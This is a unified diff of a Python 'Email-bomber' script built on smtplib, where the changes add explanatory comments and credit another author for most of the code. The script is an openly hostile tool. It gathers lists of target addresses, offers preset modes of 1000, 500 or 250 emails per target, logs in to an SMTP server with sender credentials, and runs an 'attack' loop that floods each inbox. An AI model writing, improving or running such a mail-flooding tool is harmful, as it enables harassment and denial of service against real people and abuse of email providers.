@@ -1,7 +1,7 @@
 import smtplib
 import sys
 
-
+# Terminal colours
 class bcolours:
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
@@ -9,21 +9,25 @@ class bcolours:
 
 
 def banner():
-    print(bcolours.GREEN + '+[+[+[ Email-bomber v1.0 ]+]+]+')
-    print(bcolours.GREEN + '+[+[+[ made with codes ]+]+]+')
+    print(bcolours.GREEN + '+[+[+[ Email-bomber ]+]+]+')
+    print(bcolours.GREEN + '+[+[+[ Credit to w3w3w3 for majority of code ]+]+]+')
 
 
 class Email_Bomber:
+    # 
     count = 0
 
     def __init__(self):
         try:
+            # List to hold all target emails
             self.target_emails_list = []
             print(bcolours.RED + '\n+[+[+[ Initializing program ]+]+]+')
             self.num_email_targets = int(input(bcolours.GREEN + 'Enter number of target email addresses -> '))
+            # Appends email target to target_emails_list
             for email in range(self.num_email_targets):
                 self.target = str(input(bcolours.GREEN + 'Enter target email -> '))
                 self.target_emails_list.append(self.target)
+            # Input for the number of emails to send to each email address
             self.mode = int(input(
                 bcolours.GREEN + 'Enter number of emails mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) -> '))
             if int(self.mode) > 4 or int(self.mode) < 1:
@@ -49,7 +53,9 @@ class Email_Bomber:
                 bcolours.RED + f'\n+[+[+[ Selected mode -> {self.mode} Selected amount -> {self.amount} ]+]+]+')
         except Exception as err:
             print(f'ERROR: {err}')
-
+    
+    # Grabs the email server/sender_address/sender_password
+    # Connects to smtp server
     def email(self):
         try:
             print(bcolours.RED + '\n+[+[+[ Setting up email ]+]+]+')
@@ -89,7 +95,8 @@ class Email_Bomber:
 
         except Exception as err:
             print(f'ERROR: {err}')
-
+    
+    # Sends the email
     def send(self, sender_address, target_address):
         try:
             self.message = '''From: %s\nTo: %s\nSubject: %s\n%s\n''' % (self.from_address, target_address, self.subject, self.body)
@@ -98,7 +105,8 @@ class Email_Bomber:
 
         except Exception as err:
             print(f'ERROR: {err}')
-
+    
+    # Loops through the self.target_emails_list and runs send() function
     def attack(self):
         print(bcolours.RED + '\n+[+[+[ Attacking... ]+]+]+')
         for i in range(self.amount):
